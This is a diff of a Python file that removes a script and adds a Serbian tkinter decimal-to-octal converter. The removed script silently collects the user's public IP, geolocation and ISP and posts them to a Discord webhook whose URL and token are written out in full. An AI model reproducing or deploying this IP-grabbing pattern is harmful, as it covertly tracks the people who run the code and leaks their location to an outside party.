@@ -1,32 +1,34 @@
-import requests
-import json
-from dhooks import Webhook, Embed
-from datetime import datetime
+import tkinter as tk
+from tkinter import messagebox
 
-hook = Webhook("https://discord.com/api/webhooks/1388032055975219210/EYD6AC8gWpGsONvfWkf2sjlECVYZfvDUXvwle0uiDHsJOjdJJOP9A7PyLEL4pDf-MNSI")
+def decimal_u_oktalni():
+    try:
+        decimalni_broj = int(entry.get())
+        oktalni_broj = oct(decimalni_broj)[2:]  # uklanja '0o' prefix
+        rezultat_label.config(text=f"Oktalni broj: {oktalni_broj}")
+    except ValueError:
+        messagebox.showerror("Greška", "Molim te unesi validan ceo broj.")
 
-time = datetime.now().strftime("%H:%M %p")  
-ip = requests.get('https://api.ipify.org/').text
+# Glavni prozor
+prozor = tk.Tk()
+prozor.title("Decimalni u Oktalni konverter")
+prozor.geometry("300x150")
 
-r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
-geo = r.json()
-embed = Embed()
-fields = [
-    {'name': 'IP', 'value': geo['query']},
-    {'name': 'ipType', 'value': geo['ipType']},
-    {'name': 'Country', 'value': geo['country']},
-    {'name': 'City', 'value': geo['city']},
-    {'name': 'Continent', 'value': geo['continent']},
-    {'name': 'Country', 'value': geo['country']},
-    {'name': 'IPName', 'value': geo['ipName']},
-    {'name': 'ISP', 'value': geo['isp']},
-    {'name': 'Latitute', 'value': geo['lat']},
-    {'name': 'Longitude', 'value': geo['lon']},
-    {'name': 'Org', 'value': geo['org']},
-    {'name': 'Region', 'value': geo['region']},
-    {'name': 'Status', 'value': geo['status']},
-]
-for field in fields:
-    if field['value']:
-        embed.add_field(name=field['name'], value=field['value'], inline=True)
-hook.send(embed=embed)
+# Labela za instrukciju
+instrukcija = tk.Label(prozor, text="Unesi decimalni broj:")
+instrukcija.pack(pady=5)
+
+# Polje za unos decimalnog broja
+entry = tk.Entry(prozor, width=30)
+entry.pack(pady=5)
+
+# Dugme za konverziju
+dugme = tk.Button(prozor, text="Pretvori u oktalni", command=decimal_u_oktalni)
+dugme.pack(pady=5)
+
+# Labela za prikaz rezultata
+rezultat_label = tk.Label(prozor, text="")
+rezultat_label.pack(pady=5)
+
+# Pokretanje GUI aplikacije
+prozor.mainloop()
